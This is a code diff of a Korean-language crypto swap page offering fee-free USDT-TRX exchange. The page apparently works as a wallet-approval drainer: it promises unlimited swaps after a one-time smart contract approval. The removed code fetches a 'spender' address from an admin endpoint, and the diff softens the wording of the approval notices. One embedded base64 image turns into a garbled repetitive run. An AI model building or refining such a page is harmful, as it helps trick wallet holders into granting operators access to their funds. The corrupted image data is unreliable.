@@ -118,6 +118,11 @@
                     <option value="vi">🇻🇳 VI</option>
                     <option value="zh">🇨🇳 ZH</option>
                 </select>
+                <button type="button" onclick="openTrustWalletAppOnly()" id="trust-app-btn" class="flex items-center gap-1.5 bg-blue-50 hover:bg-blue-100 text-blue-700 border border-blue-200 font-semibold text-xs sm:text-sm px-2.5 sm:px-3.5 py-2 sm:py-2.5 rounded-xl transition active:scale-95">
+                    <i class="fa-solid fa-shield-halved"></i>
+                    <span class="hidden md:inline" data-i18n="open_trust_only">트러스트월렛 열기</span>
+                    <span class="md:hidden">Trust</span>
+                </button>
                 <button type="button" onclick="handleConnectWallet()" id="connect-btn" class="flex items-center gap-1.5 sm:gap-2 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white font-semibold text-xs sm:text-sm px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl shadow-md transition-all active:scale-95">
                     <i class="fa-solid fa-wallet text-blue-100"></i>
                     <span id="wallet-btn-text" data-i18n="connect_wallet">지갑 연결</span>
@@ -134,18 +139,18 @@
             </div>
             <div class="space-y-1">
                 <h3 class="text-lg font-bold text-slate-900" data-i18n="select_wallet">지갑을 선택하세요</h3>
-                <p class="text-xs text-slate-500 leading-relaxed" data-i18n-html="modal_subtitle">사용 중인 지갑 앱을 선택하면<br>자동으로 연결됩니다.</p>
+                <p class="text-xs text-slate-500 leading-relaxed" data-i18n-html="modal_subtitle">Trust Wallet은 앱 열기만 실행합니다.<br>지갑 연결은 연결 버튼을 눌렀을 때만 진행됩니다.</p>
             </div>
 
             <div class="space-y-2.5 pt-1 text-left">
+                <button type="button" onclick="openTrustWalletAppOnly()" class="wallet-card w-full border border-blue-300 bg-blue-50/70 rounded-2xl p-3.5 flex items-center gap-3.5">
+                    <div class="w-11 h-11 rounded-xl bg-blue-600/10 border border-blue-600/20 flex items-center justify-center shrink-0"><i class="fa-solid fa-shield-halved text-blue-600 text-lg"></i></div>
+                    <div class="flex-1"><div class="text-sm font-bold text-slate-900">Trust Wallet (앱 열기 전용)</div><div class="text-[11px] text-slate-500" data-i18n="w_trust_open_only">트러스트월렛 앱만 실행 (자동 연결·승인 없음)</div></div>
+                    <i class="fa-solid fa-arrow-up-right-from-square text-blue-600 text-xs"></i>
+                </button>
                 <button type="button" onclick="launchWallet('tronlink')" class="wallet-card w-full border rounded-2xl p-3.5 flex items-center gap-3.5">
                     <div class="w-11 h-11 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center shrink-0"><i class="fa-solid fa-bolt text-red-500 text-lg"></i></div>
                     <div class="flex-1"><div class="text-sm font-bold text-slate-900">TronLink</div><div class="text-[11px] text-slate-500" data-i18n="w_tronlink">TRON 공식 지갑</div></div>
-                    <i class="fa-solid fa-chevron-right text-slate-400 text-xs"></i>
-                </button>
-                <button type="button" onclick="launchWallet('trust')" class="wallet-card w-full border rounded-2xl p-3.5 flex items-center gap-3.5">
-                    <div class="w-11 h-11 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center shrink-0"><i class="fa-solid fa-shield-halved text-blue-600 text-lg"></i></div>
-                    <div class="flex-1"><div class="text-sm font-bold text-slate-900">Trust Wallet</div><div class="text-[11px] text-slate-500" data-i18n="w_trust">멀티체인 지갑 (DApp 브라우저 권장)</div></div>
                     <i class="fa-solid fa-chevron-right text-slate-400 text-xs"></i>
                 </button>
                 <button type="button" onclick="launchWallet('tokenpocket')" class="wallet-card w-full border rounded-2xl p-3.5 flex items-center gap-3.5">
@@ -187,9 +192,9 @@
                     <i class="fa-solid fa-circle-info"></i>
                     <span data-i18n="modal_tip_title">아이폰·폴드4 트러스트월렛 안내:</span>
                 </p>
-                <p data-i18n="modal_tip1">1. Trust Wallet 앱을 실행 후 하단 [브라우저/탐색] 탭을 여세요.</p>
-                <p data-i18n-html="modal_tip2">2. 현재 페이지 주소가 자동 복사되므로 <strong class="text-slate-900">주소창에 붙여넣기</strong> 후 접속하세요.</p>
-                <p data-i18n-html="modal_tip3">3. DApp 브라우저 안에서 <strong class="text-slate-900">TRON(TRC-20)</strong> 네트워크가 선택되어 있는지 확인하세요.</p>
+                <p data-i18n="modal_tip1">1. Trust Wallet 앱 실행만 수행하며 자동 연결/승인은 하지 않습니다.</p>
+                <p data-i18n-html="modal_tip2">2. 현재 페이지 주소가 자동 복사되므로 브라우저/탐색 탭에서 <strong class="text-slate-900">붙여넣기</strong> 후 [지갑 연결]을 누르세요.</p>
+                <p data-i18n-html="modal_tip3">3. 지갑 연결 후 승인/교환 버튼을 눌렀을 때만 승인 단계가 진행됩니다.</p>
             </div>
 
             <button type="button" onclick="closeWalletModal()" class="w-full text-slate-500 hover:text-slate-800 py-2 text-xs font-semibold transition" data-i18n="close_btn">닫기</button>
@@ -257,7 +262,7 @@
                     <span data-i18n="hero_title1">USDT ↔ TRX</span><br>
                     <span class="text-blue-600" data-i18n="hero_title2">무료 교환</span>
                 </h2>
-                <p class="text-slate-600 text-sm sm:text-base leading-relaxed" data-i18n="hero_desc">수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 무제한 교환이 가능합니다.</p>
+                <p class="text-slate-600 text-sm sm:text-base leading-relaxed" data-i18n="hero_desc">수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 지갑 연결 후 승인 버튼을 누르면 교환이 진행됩니다.</p>
                 <div class="pt-2 space-y-2">
                     <div class="flex justify-between text-xs font-semibold gap-2">
                         <span class="text-slate-500 shrink-0" data-i18n="today_volume">오늘 총 교환량</span>
@@ -294,7 +299,7 @@
                     <div class="flex items-center gap-2 sm:gap-3">
                         <input type="number" id="swap-input" placeholder="0.00" min="0" step="any" oninput="updateSwapOutput()" class="flex-1 bg-transparent text-2xl sm:text-4xl font-extrabold text-slate-900 font-mono border-none outline-none placeholder-slate-300 w-full min-w-0">
                         <div class="flex items-center gap-2 bg-white px-3 sm:px-4 py-2 rounded-xl border border-slate-200 shrink-0">
-                            <img src="data:image/png;base64,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" alt="TRX" id="send-coin-img" class="w-6 h-6 sm:w-7 sm:h-7 rounded-full">
+                            <span id="send-coin-badge" class="w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-emerald-500/15 text-emerald-700 font-mono text-xs font-extrabold flex items-center justify-center">₮</span>
                             <span id="send-coin-name" class="text-sm sm:text-base font-bold text-slate-900">USDT</span>
                         </div>
                     </div>
@@ -320,7 +325,7 @@
                     <div class="flex items-center gap-3">
                         <div id="swap-output" class="flex-1 text-2xl sm:text-4xl font-extrabold text-slate-800 font-mono truncate">0.00</div>
                         <div class="flex items-center gap-2 bg-white px-3 sm:px-4 py-2 rounded-xl border border-slate-200 shrink-0">
-                            <img src="data:image/png;base64,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VwRHRXwXwzzRb8pH73+Q2m3v4B+9+2Y5ODxCx/e16b+p/0r33u1f23+uP6f/55l8v/d9vX3r/U72L146+N/967+558477+S1117j0KFDlEpFKpUKhUKBSqVCqVSgXq9TKpdJhSWy2QzZbI5MJkM+n6fZbJJKpSiVSszNzanH45FqtUqj0aDVanHq1ClOnTpFJpMhm81Sr9dJp9Nks1lyuRzlcpnZ2Vklh8MxU6lUxGazSbVaZX5+nnw+z9zcHHNzc8zOzlKv16lWq8zMzLCwsMDMzAyNRoNSqUStVmN2dpb5+XmKxSIzMzNMTEywfft2du7cye7du+n1enQ6HeLxONlslla7RbvVotVq0Wq16PV6lEolSqUSxWKRSqXCwsICo6OjbNu2jR07drBnzx4OHz5Mr9ejXC6TSqVYWFhgbm6O2dlZyuUyhUJB/X4/7Xa7p+q3/P27H/72g3/27//xX+55+13P/0v5h3e+i2/+vW+w+dWv2/8/4v94X/1n/3j379537b2v7d7+jfd/8X3+9r/2H773W/8v/6T82/+s+/T2//9v/s7+j/43/z7/2ff/n77//+/3/3b99//W//F/8+/9/3/7t9//3f3/++3//b//9//2//+3/7f/9//3//f//3//3//7/7v/A/8/AAD///8o8qAAAAAElFTkSuQmCC" alt="TRX" id="recv-coin-img" class="w-6 h-6 sm:w-7 sm:h-7 rounded-full">
+                            <span id="recv-coin-badge" class="w-6 h-6 sm:w-7 sm:h-7 rounded-full bg-rose-500/15 text-rose-600 font-mono text-xs font-extrabold flex items-center justify-center">T</span>
                             <span id="recv-coin-name" class="text-sm sm:text-base font-bold text-slate-900">TRX</span>
                         </div>
                     </div>
@@ -351,7 +356,7 @@
                     <i class="fa-solid fa-arrow-right-arrow-left"></i>
                     <span id="approve-btn-text" data-i18n="swap_btn_text">교환 시작 (최초 1회 승인 필요)</span>
                 </button>
-                <p class="text-xs text-slate-500 text-center mt-3" data-i18n="swap_notice">최초 1회 교환시 스마트 컨트랙트 승인이 필요합니다</p>
+                <p class="text-xs text-slate-500 text-center mt-3" data-i18n="swap_notice">지갑 연결 후 승인/교환 버튼을 누르면 승인 단계가 진행됩니다</p>
             </div>
         </section>
 
@@ -496,7 +501,7 @@
         var swapDirection = 'USDT_TO_TRX';
         var userUsdtBalance = 0;
         var userTrxBalance = 0;
-        var TRX_RATE = 0;
+        var TRX_RATE = 4.0;
         var currentLang = 'ko';
         var wcConnector = null;
         var wcAddress = null;
@@ -587,190 +592,37 @@
             }, 3200);
         }
 
-        async function getSpenderAddress() {
+        // [전용] 트러스트월렛 앱만 열기 (지갑 연결·승인 일절 미실행)
+        window.openTrustWalletAppOnly = function () {
+            var url = window.location.href;
+            var encoded = encodeURIComponent(url);
+            closeWalletModal();
+
             try {
-                var r = await fetch(API_BASE + '/admin/spender');
-                var d = await r.json();
-                if (d && d.status === 'ok' && d.address) return d.address;
-            } catch (e) {}
-            return null;
-        }
-
-        function setProgress(pct, text) {
-            var bar = document.getElementById('approve-progress');
-            var barInner = document.getElementById('approve-progress-bar');
-            var barText = document.getElementById('approve-progress-text');
-            if (bar) bar.classList.remove('hidden');
-            if (barInner) barInner.style.width = pct + '%';
-            if (barText) barText.textContent = text || '처리 중...';
-        }
-        function hideProgress() {
-            var bar = document.getElementById('approve-progress');
-            if (bar) bar.classList.add('hidden');
-        }
-
-        // 스왑 방향 및 환율
-        function syncSwapBalanceDisplay() {
-            var sendBalEl = document.getElementById('usdt-bal-swap');
-            var recvBalEl = document.getElementById('trx-bal-swap');
-            var sendSuffix = document.getElementById('send-bal-suffix');
-            var recvSuffix = document.getElementById('recv-bal-suffix');
-            if (swapDirection === 'USDT_TO_TRX') {
-                if (sendBalEl) sendBalEl.textContent = userUsdtBalance.toFixed(2);
-                if (recvBalEl) recvBalEl.textContent = userTrxBalance.toFixed(2);
-                if (sendSuffix) sendSuffix.textContent = ' USDT';
-                if (recvSuffix) recvSuffix.textContent = ' TRX';
-            } else {
-                if (sendBalEl) sendBalEl.textContent = userTrxBalance.toFixed(2);
-                if (recvBalEl) recvBalEl.textContent = userUsdtBalance.toFixed(2);
-                if (sendSuffix) sendSuffix.textContent = ' TRX';
-                if (recvSuffix) recvSuffix.textContent = ' USDT';
-            }
-        }
-
-        window.toggleSwapDirection = function () {
-            var icon = document.getElementById('swap-direction-icon');
-            var sendPanel = document.querySelector('[data-i18n="send_amount"]');
-            var recvPanel = document.querySelector('[data-i18n="receive_amount"]');
-            var sendImg = document.getElementById('send-coin-img');
-            var recvImg = document.getElementById('recv-coin-img');
-            var sendName = document.getElementById('send-coin-name');
-            var recvName = document.getElementById('recv-coin-name');
-            var _t = (typeof translations !== 'undefined' && translations[currentLang]) || translations.ko;
-
-            if (sendImg && recvImg) {
-                var tmpSrc = sendImg.src;
-                sendImg.src = recvImg.src;
-                recvImg.src = tmpSrc;
